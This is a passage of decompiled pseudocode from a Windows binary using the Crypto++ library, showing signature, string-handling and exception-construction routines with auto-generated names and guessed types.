  __int128 v32; // [rsp+90h] [rbp-F8h] BYREF
  __int64 v33[2]; // [rsp+A0h] [rbp-E8h] BYREF
  unsigned __int64 v34; // [rsp+B0h] [rbp-D8h]
  unsigned __int64 v35; // [rsp+B8h] [rbp-D0h]
  void *v36; // [rsp+C0h] [rbp-C8h]
  __int64 v37; // [rsp+D8h] [rbp-B0h]
  __int64 v38; // [rsp+E0h] [rbp-A8h]
  void *v39; // [rsp+E8h] [rbp-A0h]
  char pExceptionObject[16]; // [rsp+F0h] [rbp-98h] BYREF
  unsigned __int64 v41; // [rsp+100h] [rbp-88h] BYREF
  unsigned __int64 v42; // [rsp+108h] [rbp-80h] BYREF
  void *v43; // [rsp+110h] [rbp-78h]

  v31 = -2i64;
  (*(void (__fastcall **)(_QWORD *, __int128 *))(*a1 + 120i64))(a1, &v30);
  v6 = (_QWORD *)(*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 24i64))(a1 + 2);
  v28 = v6;
  v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a3 + 152i64))(a3);
  v8 = *v6;
  v9 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v7 + 64i64))(v7);
  v10 = (*(__int64 (__fastcall **)(_QWORD *, _QWORD, _QWORD))(v8 + 8))(v6, DWORD2(v30), v9);
  if ( sub_13F10E1C0((__int64)a1) < v10 )
  {
    sub_13F10D4A0((__int64)pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__);
  }
  v11 = sub_13F10E1C0((__int64)a1);
  v12 = (unsigned __int64)(v11 + 7) >> 3;
  v37 = -1i64;
  v38 = v12;
  if ( v12 )
    v13 = (void *)sub_13F12E4E0((unsigned __int64)(v11 + 7) >> 3);
  else
    v13 = 0i64;
  v39 = v13;
  v32 = v30;
  v14 = *(_QWORD *)(a3 + 24);
  v15 = *(_QWORD *)(a3 + 32);
  v16 = *v6;
  v17 = sub_13F10E1C0((__int64)a1);
  v18 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a3 + 152i64))(a3);
  (*(void (__fastcall **)(_QWORD *, __int64, __int64, __int64, __int64, __int128 *, _BYTE, void *, __int64))(v16 + 48))(
    v28,
    a2,
    v15,
    v14,
    v18,
    &v32,
    *(_BYTE *)(a3 + 232),
    v13,
    v17);
  *(_BYTE *)(a3 + 232) = 1;
  sub_13F112B70(v33, (__int64)v13, v12, 0, 1);
  v19 = (*(__int64 (__fastcall **)(_QWORD *))(*a1 + 8i64))(a1);
  v20 = (*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 16i64))(a1 + 2);
  v21 = (*(__int64 (__fastcall **)(__int64, char *, __int64, __int64 *))(*(_QWORD *)v20 + 8i64))(
          v20,
          pExceptionObject,
          a2,
          v33);
  sub_13F11D700(v21, a4, v19, 0);
  v22 = &v41;
  if ( v41 >= v42 )
    v22 = &v42;
  v23 = (__int64)v43;
  if ( v43 )
  {
    memset(v43, 0, 8 * *v22);
    sub_13F12E4D0(v23);
  }
  v24 = v35;
  if ( v34 < v35 )
    v24 = v34;
  v25 = (__int64)v36;
  if ( v36 )
  {
    memset(v36, 0, 8 * v24);
    sub_13F12E4D0(v25);
  }
  if ( v13 )
  {
    memset(v13, 0, v12);
    sub_13F12E550(v13);
  }
  return v19;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F10E550: using guessed type _QWORD var_E8[2];

//----- (000000013F10E7F0) ----------------------------------------------------
__int64 __fastcall sub_13F10E7F0(_QWORD *a1, __int64 a2)
{
  __int64 *v4; // r15
  __int64 v5; // rax
  __int64 v6; // rbx
  unsigned int v7; // eax
  unsigned __int64 v8; // rbx
  __int64 v9; // rsi
  __int64 v10; // rdi
  __int64 v11; // rbx
  __int64 v12; // rax
  __int64 result; // rax
  __int128 v14; // [rsp+30h] [rbp-98h] BYREF
  __int128 v15; // [rsp+40h] [rbp-88h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-78h] BYREF

  (*(void (__fastcall **)(_QWORD *, __int128 *))(*a1 + 136i64))(a1, &v14);
  v4 = (__int64 *)(*(__int64 (__fastcall **)(_QWORD *))(a1[2] + 24i64))(a1 + 2);
  v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 152i64))(a2);
  v6 = *v4;
  v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 64i64))(v5);
  v8 = (*(__int64 (__fastcall **)(__int64 *, _QWORD, _QWORD))(v6 + 8))(v4, DWORD2(v14), v7);
  if ( sub_13F10E1C0((__int64)a1) < v8 )
  {
    sub_13F10D4A0((__int64)pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVKeyTooShort_PK_SignatureScheme_CryptoPP__);
  }
  v9 = *v4;
  v10 = *(_QWORD *)(a2 + 64);
  v15 = v14;
  v11 = sub_13F10E1C0((__int64)a1);
  v12 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 152i64))(a2);
  result = (*(__int64 (__fastcall **)(__int64 *, __int64, __int128 *, _QWORD, __int64, __int64))(v9 + 56))(
             v4,
             v12,
             &v15,
             *(unsigned __int8 *)(a2 + 232),
             v10,
             v11);
  *(_BYTE *)(a2 + 232) = 1;
  return result;
}

//----- (000000013F10E920) ----------------------------------------------------
_BOOL8 __fastcall sub_13F10E920(__int64 *a1, __int64 a2, __int128 *a3, char a4, __int64 a5, __int64 a6)
{
  __int64 v10; // rbx
  __m128i *v11; // rsi
  __int64 v12; // rdi
  void ***v13; // rax
  bool v14; // bp
  __int128 v16; // [rsp+60h] [rbp-78h] BYREF
  __int64 v17; // [rsp+78h] [rbp-60h]
  __int64 v18; // [rsp+80h] [rbp-58h]
  __m128i *v19; // [rsp+88h] [rbp-50h]

  v10 = (unsigned __int64)(a6 + 7) >> 3;
  v17 = -1i64;
  v18 = v10;
  if ( v10 )
    v11 = (__m128i *)sub_13F12E4E0((unsigned __int64)(a6 + 7) >> 3);
  else
    v11 = 0i64;
  v19 = v11;
  v16 = *a3;
  v12 = *a1;
  v13 = sub_13F110680();
  (*(void (__fastcall **)(__int64 *, void ***, _QWORD, _QWORD, __int64, __int128 *, char, __m128i *, __int64))(v12 + 48))(
    a1,
    v13,
    0i64,
    0i64,
    a2,
    &v16,
    a4,
    v11,
    a6);
  v14 = sub_13F1338C0(a5, v11, v10);
  if ( v11 )
  {
    memset(v11, 0, v10);
    sub_13F12E550(v11);
  }
  return v14;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F10E920: using guessed type __int128 var_78;

//----- (000000013F10EA10) ----------------------------------------------------
__m128i *__fastcall sub_13F10EA10(__m128i *a1, const __m128i *a2, __m128i *a3)
{
  unsigned __int64 v4; // r9
  __m128i *v5; // rax

  v4 = -1i64;
  do
    ++v4;
  while ( a2->m128i_i8[v4] );
  v5 = sub_13F107C80(a3, 0i64, a2, v4);
  a1[1].m128i_i64[0] = 0i64;
  a1[1].m128i_i64[1] = 0i64;
  *a1 = *v5;
  a1[1] = v5[1];
  v5[1].m128i_i64[0] = 0i64;
  v5[1].m128i_i64[1] = 15i64;
  v5->m128i_i8[0] = 0;
  return a1;
}

//----- (000000013F10EA70) ----------------------------------------------------
__m128i *__fastcall sub_13F10EA70(__m128i *a1, unsigned int a2, unsigned int a3)
{
  unsigned int v3; // er13
  unsigned int v5; // er12
  unsigned int v6; // ecx
  unsigned int v7; // er8
  unsigned __int64 v8; // rsi
  unsigned __int64 v9; // r14
  unsigned int v10; // edx
  int v11; // edi
  char v12; // bl
  int v13; // er12
  __int8 v14; // di
  __int128 v15; // kr00_16
  __int128 *v16; // rax
  const __m128i *v17; // r9
  __int64 v18; // rdi
  __int128 v19; // kr10_16
  __int128 *v20; // rbx
  __m128i *v21; // rbx
  unsigned __int64 v22; // rdx
  __int64 v23; // rax
  __m128i v24; // xmm0
  __m128i v25; // xmm1
  unsigned int v27; // [rsp+34h] [rbp-25h]
  unsigned int v28; // [rsp+38h] [rbp-21h]
  __int128 v29; // [rsp+48h] [rbp-11h] BYREF
  __int128 v30; // [rsp+58h] [rbp-1h]
  __int128 v31; // [rsp+68h] [rbp+Fh] BYREF
  __int128 v32; // [rsp+78h] [rbp+1Fh]

  v3 = a2;
  v5 = 0;
  v6 = a3 >> 26;
  v28 = a3 >> 26;
  v7 = a3 & 0x7FFFFFFF;
  v27 = v7;
  if ( a2 )
  {
    v8 = 0i64;
    *(_QWORD *)&v32 = 0i64;
    v9 = 15i64;
    *((_QWORD *)&v32 + 1) = 15i64;
    LOBYTE(v31) = 0;
    while ( 1 )
    {
      v10 = v3 % v7;
      v11 = v3 % v7;
      v3 /= v7;
      v12 = v10 >= 0xA ? (~(_BYTE)v6 & 0x20 | 0x41) - 10 : 48;
      *(_QWORD *)&v30 = 0i64;
      *((_QWORD *)&v30 + 1) = 15i64;
      LOBYTE(v29) = 0;
      v13 = v5 | 2;
      sub_13F106B80((__m128i *)&v29, v8 + 1);
      v14 = v12 + v11;
      v15 = v30;
      if ( (unsigned __int64)v30 >= *((_QWORD *)&v30 + 1) )
      {
        sub_13F10ECD0((__m128i *)&v29, 1ui64, 0i64, v14);
      }
      else
      {
        *(_QWORD *)&v30 = v30 + 1;
        v16 = &v29;
        if ( *((_QWORD *)&v15 + 1) >= 0x10ui64 )
          v16 = (__int128 *)v29;
        *((_BYTE *)v16 + v15) = v14;
        *((_BYTE *)v16 + v15 + 1) = 0;
      }
      v17 = (const __m128i *)&v31;
      v18 = v31;
      if ( v9 >= 0x10 )
        v17 = (const __m128i *)v31;
      v19 = v30;
      if ( v8 > *((_QWORD *)&v30 + 1) - (_QWORD)v30 )
      {
        sub_13F107AD0((__m128i *)&v29, v8, 0i64, v17, v8);
        v9 = *((_QWORD *)&v32 + 1);
        v18 = v31;
      }
      else
      {
        *(_QWORD *)&v30 = v8 + v30;
        v20 = &v29;
        if ( *((_QWORD *)&v19 + 1) >= 0x10ui64 )
          v20 = (__int128 *)v29;
        v21 = (__m128i *)((char *)v20 + v19);
        sub_13F15EB00(v21, v17, v8);
        v21->m128i_i8[v8] = 0;
      }
      if ( v9 >= 0x10 )
      {
        v22 = v9 + 1;
        v23 = v18;
        if ( v9 + 1 >= 0x1000 )
        {
          v22 = v9 + 40;
          v18 = *(_QWORD *)(v18 - 8);
          if ( (unsigned __int64)(v23 - v18 - 8) > 0x1F )
            sub_13F1682C0();
        }
        sub_13F14088C(v18, v22);
      }
      v24 = (__m128i)v29;
      v31 = v29;
      v25 = (__m128i)v30;
      v32 = v30;
      v5 = v13 & 0xFFFFFFFD;
      if ( !v3 )
        break;
      v9 = *((_QWORD *)&v32 + 1);
      v8 = v32;
      v7 = v27;
      LOBYTE(v6) = v28;
    }
    a1[1].m128i_i64[0] = 0i64;
    a1[1].m128i_i64[1] = 0i64;
    *a1 = v24;
    a1[1] = v25;
  }
  else
  {
    a1[1].m128i_i64[0] = 0i64;
    a1[1].m128i_i64[1] = 15i64;
    a1->m128i_i8[0] = 0;
    sub_13F106C30(a1, (const __m128i *)"0");
  }
  return a1;
}
// 13F10EB09: conditional instruction was optimized away because edx.4!=0
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F10ECD0) ----------------------------------------------------
__m128i *__fastcall sub_13F10ECD0(__m128i *a1, unsigned __int64 a2, __int64 a3, __int8 a4)
{
  unsigned __int64 v4; // r14
  __int64 v5; // rbx
  unsigned __int64 v8; // rbp
  __int64 v9; // r15
  unsigned __int64 v10; // rcx
  unsigned __int64 v11; // rdx
  __int64 v12; // rcx
  __int64 v13; // rax
  __m128i *v14; // rdi
  __int64 v15; // rbx
  unsigned __int64 v16; // rdx

  v4 = a1[1].m128i_u64[0];
  v5 = 0x7FFFFFFFFFFFFFFFi64;
  if ( 0x7FFFFFFFFFFFFFFFi64 - v4 < a2 )
    sub_13F107C60();
  v8 = a1[1].m128i_u64[1];
  v9 = v4 + a2;
  v10 = (v4 + a2) | 0xF;
  if ( v10 <= 0x7FFFFFFFFFFFFFFFi64 )
  {
    v11 = v8 >> 1;
    if ( v8 <= 0x7FFFFFFFFFFFFFFFi64 - (v8 >> 1) )
    {
      v5 = v10;
      if ( v10 < v11 + v8 )
        v5 = v11 + v8;
    }
  }
  if ( (unsigned __int64)(v5 + 1) < 0x1000 )
  {
    if ( v5 == -1 )
      v14 = 0i64;
    else
      v14 = (__m128i *)sub_13F14059C(v5 + 1);
  }
  else
  {
    v12 = v5 + 40;
    if ( v5 + 40 <= (unsigned __int64)(v5 + 1) )
      v12 = -1i64;
    v13 = sub_13F14059C(v12);
    if ( !v13 )
      goto LABEL_21;
    v14 = (__m128i *)((v13 + 39) & 0xFFFFFFFFFFFFFFE0ui64);
    v14[-1].m128i_i64[1] = v13;
  }
  a1[1].m128i_i64[0] = v9;
  a1[1].m128i_i64[1] = v5;
  if ( v8 < 0x10 )
  {
    sub_13F15EB00(v14, a1, v4);
    v14->m128i_i8[v4] = a4;
    v14->m128i_i8[v4 + 1] = 0;
    goto LABEL_20;
  }
  v15 = a1->m128i_i64[0];
  sub_13F15EB00(v14, (const __m128i *)a1->m128i_i64[0], v4);
  v16 = v8 + 1;
  v14->m128i_i8[v4] = a4;
  v14->m128i_i8[v4 + 1] = 0;
  if ( v8 + 1 >= 0x1000 )
  {
    v16 = v8 + 40;
    if ( (unsigned __int64)(v15 - *(_QWORD *)(v15 - 8) - 8) <= 0x1F )
    {
      v15 = *(_QWORD *)(v15 - 8);
      goto LABEL_18;
    }
LABEL_21:
    sub_13F1682C0();
  }
LABEL_18:
  sub_13F14088C(v15, v16);
LABEL_20:
  a1->m128i_i64[0] = (__int64)v14;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F10EE30) ----------------------------------------------------
__int64 __fastcall sub_13F10EE30(__int64 a1, char a2)
{
  __m128i v4[2]; // [rsp+28h] [rbp-80h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-58h] BYREF

  if ( a2 && sub_13F102490() )
  {
    if ( !(unsigned int)sub_13F134280() && !sub_13F102490() )
    {
      sub_13F1053B0(
        v4,
        (const __m128i *)"Cryptographic algorithms are disabled before the power-up self tests are performed.");
      sub_13F10F5E0((__int64)pExceptionObject, v4);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVSelfTestFailure_CryptoPP__);
    }
    if ( (unsigned int)sub_13F134280() == 1 )
    {
      sub_13F1053B0(v4, (const __m128i *)"Cryptographic algorithms are disabled after a power-up self test failed.");
      sub_13F10F5E0((__int64)pExceptionObject, v4);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVSelfTestFailure_CryptoPP__);
    }
  }
  return a1;
}
// 13F10EE30: using guessed type __m128i var_80[2];

//----- (000000013F10EF10) ----------------------------------------------------
_QWORD *__fastcall sub_13F10EF10(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = off_13F1833F8;
  return a1;
}
// 13F1833F8: using guessed type __int64 (__fastcall *off_13F1833F8[3])();

//----- (000000013F10EF40) ----------------------------------------------------
__int64 __fastcall sub_13F10EF40(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 4;
  sub_13F1053F0((__m128i **)(a1 + 32), a2);
  *(_QWORD *)a1 = off_13F1833F8;
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F1833F8: using guessed type __int64 (__fastcall *off_13F1833F8[3])();

//----- (000000013F10EF90) ----------------------------------------------------
_QWORD *__fastcall sub_13F10EF90(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = &CryptoPP::InvalidKeyLength::`vftable';
  return a1;
}
// 13F183508: using guessed type void *CryptoPP::InvalidKeyLength::`vftable';

//----- (000000013F10EFC0) ----------------------------------------------------
__int64 __fastcall sub_13F10EFC0(__int64 a1, const __m128i *a2, unsigned __int64 a3)
{
  __m128i *v5; // rdi
  const __m128i *v6; // r14
  unsigned __int64 v7; // r14
  __m128i v8; // kr00_16
  __m128i *v9; // rbx
  __m128i *v10; // rbx
  __m128i v11; // kr10_16
  __m128i *v12; // rbx
  __m128i *v13; // rbx
  unsigned __int64 v14; // r8
  const __m128i *v15; // r8
  __m128i *v16; // rax
  __m128i v17; // kr20_16
  __m128i *v18; // rbx
  __m128i *v19; // rbx
  __m128i *v20; // rax
  __int64 v21; // rdx
  __int64 v22; // rcx
  __int64 v23; // rdx
  __int64 v24; // rcx
  __int64 v25; // rdx
  __int64 v26; // rcx
  unsigned __int64 v27; // rdx
  __int64 v28; // rcx
  __m128i v30; // [rsp+48h] [rbp-61h] BYREF
  __m128i si128; // [rsp+58h] [rbp-51h]
  __m128i v32; // [rsp+68h] [rbp-41h] BYREF
  __m128i v33; // [rsp+78h] [rbp-31h]
  __m128i v34; // [rsp+88h] [rbp-21h] BYREF
  __m128i v35; // [rsp+98h] [rbp-11h]
  __m128i v36; // [rsp+A8h] [rbp-1h] BYREF
  unsigned __int64 v37; // [rsp+C0h] [rbp+17h]

  v5 = sub_13F1124A0(&v36, a3, 0xAui64);
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v30.m128i_i8[0] = 0;
  v6 = a2 + 1;
  sub_13F106B80(&v30, a2[1].m128i_i64[0] + 2);
  if ( a2[1].m128i_i64[1] >= 0x10ui64 )
    a2 = (const __m128i *)a2->m128i_i64[0];
  v7 = v6->m128i_i64[0];
  v8 = si128;
  if ( v7 > si128.m128i_i64[1] - si128.m128i_i64[0] )
  {
    sub_13F107AD0(&v30, v7, 0i64, a2, v7);
  }
  else
  {
    si128.m128i_i64[0] += v7;
    v9 = &v30;
    if ( v8.m128i_i64[1] >= 0x10ui64 )
      v9 = (__m128i *)v30.m128i_i64[0];
    v10 = (__m128i *)((char *)v9 + v8.m128i_i64[0]);
    sub_13F15EB00(v10, a2, v7);
    v10->m128i_i8[v7] = 0;
  }
  v11 = si128;
  if ( si128.m128i_i64[1] - si128.m128i_i64[0] < 2ui64 )
  {
    sub_13F107AD0(&v30, 2ui64, 0i64, (const __m128i *)qword_13F180808, 2ui64);
  }
  else
  {
    si128.m128i_i64[0] += 2i64;
    v12 = &v30;
    if ( v11.m128i_i64[1] >= 0x10ui64 )
      v12 = (__m128i *)v30.m128i_i64[0];
    v13 = (__m128i *)((char *)v12 + v11.m128i_i64[0]);
    sub_13F15EB00(v13, (const __m128i *)qword_13F180808, 2ui64);
    v13->m128i_i8[2] = 0;
  }
  v14 = v5[1].m128i_u64[0];
  if ( v14 <= si128.m128i_i64[1] - si128.m128i_i64[0] || v5[1].m128i_i64[1] - v14 < si128.m128i_i64[0] )
  {
    if ( v5[1].m128i_i64[1] >= 0x10ui64 )
      v5 = (__m128i *)v5->m128i_i64[0];
    v16 = sub_13F106DB0(&v30, v5, v14);
  }
  else
  {
    v15 = &v30;
    if ( si128.m128i_i64[1] >= 0x10ui64 )
      v15 = (const __m128i *)v30.m128i_i64[0];
    v16 = sub_13F107C80(v5, 0i64, v15, si128.m128i_u64[0]);
  }
  v33 = 0i64;
  v32 = *v16;
  v33 = v16[1];
  v16[1].m128i_i64[0] = 0i64;
  v16[1].m128i_i64[1] = 15i64;
  v16->m128i_i8[0] = 0;
  v17 = v33;
  if ( v33.m128i_i64[1] - v33.m128i_i64[0] < 0x1Aui64 )
  {
    v20 = sub_13F107AD0(&v32, 0x1Aui64, 0i64, (const __m128i *)" is not a valid key length", 0x1Aui64);
  }
  else
  {
    v33.m128i_i64[0] += 26i64;
    v18 = &v32;
    if ( v17.m128i_i64[1] >= 0x10ui64 )
      v18 = (__m128i *)v32.m128i_i64[0];
    v19 = (__m128i *)((char *)v18 + v17.m128i_i64[0]);
    sub_13F15EB00(v19, (const __m128i *)" is not a valid key length", 0x1Aui64);
    v19[1].m128i_i8[10] = 0;
    v20 = &v32;
  }
  v34 = *v20;
  v35 = v20[1];
  v20[1].m128i_i64[0] = 0i64;
  v20[1].m128i_i64[1] = 15i64;
  v20->m128i_i8[0] = 0;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 1;
  sub_13F1053F0((__m128i **)(a1 + 32), &v34);
  *(_QWORD *)a1 = off_13F181CC0;
  if ( v35.m128i_i64[1] >= 0x10ui64 )
  {
    v21 = v35.m128i_i64[1] + 1;
    v22 = v34.m128i_i64[0];
    if ( (unsigned __int64)(v35.m128i_i64[1] + 1) >= 0x1000 )
    {
      v21 = v35.m128i_i64[1] + 40;
      v22 = *(_QWORD *)(v34.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v34.m128i_i64[0] - v22 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v22, v21);
  }
  if ( v33.m128i_i64[1] >= 0x10ui64 )
  {
    v23 = v33.m128i_i64[1] + 1;
    v24 = v32.m128i_i64[0];
    if ( (unsigned __int64)(v33.m128i_i64[1] + 1) >= 0x1000 )
    {
      v23 = v33.m128i_i64[1] + 40;
      v24 = *(_QWORD *)(v32.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v32.m128i_i64[0] - v24 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v24, v23);
  }
  v33 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v32.m128i_i8[0] = 0;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v25 = si128.m128i_i64[1] + 1;
    v26 = v30.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v25 = si128.m128i_i64[1] + 40;
      v26 = *(_QWORD *)(v30.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v30.m128i_i64[0] - v26 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v26, v25);
  }
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v30.m128i_i8[0] = 0;
  if ( v37 >= 0x10 )
  {
    v27 = v37 + 1;
    v28 = v36.m128i_i64[0];
    if ( v37 + 1 >= 0x1000 )
    {
      v27 = v37 + 40;
      v28 = *(_QWORD *)(v36.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v36.m128i_i64[0] - v28 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v28, v27);
  }
  *(_QWORD *)a1 = &CryptoPP::InvalidKeyLength::`vftable';
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180808: using guessed type __int64 qword_13F180808[2];
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CC0: using guessed type __int64 (__fastcall *off_13F181CC0[3])();
// 13F183508: using guessed type void *CryptoPP::InvalidKeyLength::`vftable';
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;
// 13F10EFC0: using guessed type __m128i var_58;

//----- (000000013F10F3A0) ----------------------------------------------------
_QWORD *__fastcall sub_13F10F3A0(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = &CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';
  return a1;
}
// 13F183480: using guessed type void *CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';

//----- (000000013F10F3D0) ----------------------------------------------------
__int64 __fastcall sub_13F10F3D0(__int64 a1, const __m128i *a2)
{
  const __m128i *v2; // rsi
  const __m128i *v4; // rbp
  unsigned __int64 v5; // rbp
  __m128i v6; // kr00_16
  __m128i *v7; // rbx
  __m128i *v8; // rbx
  __m128i v9; // kr10_16
  __m128i *v10; // rbx
  __m128i *v11; // rbx
  __int64 v12; // rdx
  __int64 v13; // rcx
  __m128i v15; // [rsp+48h] [rbp-40h] BYREF
  __m128i si128; // [rsp+58h] [rbp-30h]

  v2 = a2;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v15.m128i_i8[0] = 0;
  v4 = a2 + 1;
  sub_13F106B80(&v15, a2[1].m128i_i64[0] + 47);
  if ( v2[1].m128i_i64[1] >= 0x10ui64 )
    v2 = (const __m128i *)v2->m128i_i64[0];
  v5 = v4->m128i_i64[0];
  v6 = si128;
  if ( v5 > si128.m128i_i64[1] - si128.m128i_i64[0] )
  {
    sub_13F107AD0(&v15, v5, 0i64, v2, v5);
  }
  else
  {
    si128.m128i_i64[0] += v5;
    v7 = &v15;
    if ( v6.m128i_i64[1] >= 0x10ui64 )
      v7 = (__m128i *)v15.m128i_i64[0];
    v8 = (__m128i *)((char *)v7 + v6.m128i_i64[0]);
    sub_13F15EB00(v8, v2, v5);
    v8->m128i_i8[v5] = 0;
  }
  v9 = si128;
  if ( si128.m128i_i64[1] - si128.m128i_i64[0] < 0x2Fui64 )
  {
    sub_13F107AD0(&v15, 0x2Fui64, 0i64, (const __m128i *)": this object doesn't support multiple channels", 0x2Fui64);
  }
  else
  {
    si128.m128i_i64[0] += 47i64;
    v10 = &v15;
    if ( v9.m128i_i64[1] >= 0x10ui64 )
      v10 = (__m128i *)v15.m128i_i64[0];
    v11 = (__m128i *)((char *)v10 + v9.m128i_i64[0]);
    sub_13F15EB00(v11, (const __m128i *)": this object doesn't support multiple channels", 0x2Fui64);
    v11[2].m128i_i8[15] = 0;
  }
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 0;
  sub_13F1053F0((__m128i **)(a1 + 32), &v15);
  *(_QWORD *)a1 = off_13F181CD8;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v12 = si128.m128i_i64[1] + 1;
    v13 = v15.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v12 = si128.m128i_i64[1] + 40;
      v13 = *(_QWORD *)(v15.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v15.m128i_i64[0] - v13 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v13, v12);
  }
  *(_QWORD *)a1 = &CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F181CD8: using guessed type __int64 (__fastcall *off_13F181CD8[3])();
// 13F183480: using guessed type void *CryptoPP::BufferedTransformation::NoChannelSupport::`vftable';
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F10F5B0) ----------------------------------------------------
_QWORD *__fastcall sub_13F10F5B0(_QWORD *a1, const __m128i *a2)
{
  sub_13F101F00((__int64)a1, a2);
  *a1 = off_13F183760;
  return a1;
}
// 13F183760: using guessed type __int64 (__fastcall *off_13F183760[2])();

//----- (000000013F10F5E0) ----------------------------------------------------
__int64 __fastcall sub_13F10F5E0(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 6;
  sub_13F1053F0((__m128i **)(a1 + 32), a2);
  *(_QWORD *)a1 = off_13F183760;
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F183760: using guessed type __int64 (__fastcall *off_13F183760[2])();

//----- (000000013F10F630) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F10F630(__int64 a1)
{
  void *v1; // rdi
  unsigned __int64 result; // rax
  unsigned __int64 v3; // rdx

  v1 = *(void **)(a1 + 280);
  result = *(_QWORD *)(a1 + 264);
  v3 = *(_QWORD *)(a1 + 272);
  *(_BYTE *)(a1 + 257) = 0;
  if ( v1 == (void *)a1 )
  {
    if ( result < v3 )
      v3 = result;
    result = 0i64;
    memset(v1, 0, v3);
  }
  return result;
}

//----- (000000013F10F66C) ----------------------------------------------------
__int64 __fastcall sub_13F10F66C(__int64 a1, char a2)
{
  return sub_13F10F690(a1 - 8, a2);
}

//----- (000000013F10F678) ----------------------------------------------------
_QWORD *__fastcall sub_13F10F678(__int64 a1, char a2)
{
  return sub_13F10F6C0((_QWORD *)(a1 - 8), a2);
}

//----- (000000013F10F690) ----------------------------------------------------
__int64 __fastcall sub_13F10F690(__int64 a1, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 24i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F10F6C0) ----------------------------------------------------
_QWORD *__fastcall sub_13F10F6C0(_QWORD *a1, char a2)
{
  __int64 v4; // rdi
  unsigned __int64 v5; // rcx
  void *v6; // r8
  void (__fastcall ***v7)(_QWORD, __int64); // rcx

  v4 = 21i64;
  if ( a1[20] < a1[21] )
    v4 = 20i64;
  v5 = a1[v4];
  v6 = (void *)a1[22];
  if ( v6 )
  {
    memset(v6, 0, v5);
    sub_13F12E550(v6);
  }
  sub_13F1315A0(a1 + 9);
  v7 = (void (__fastcall ***)(_QWORD, __int64))a1[3];
  if ( v7 )
    (**v7)(v7, 1i64);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 200i64);
  return a1;
}
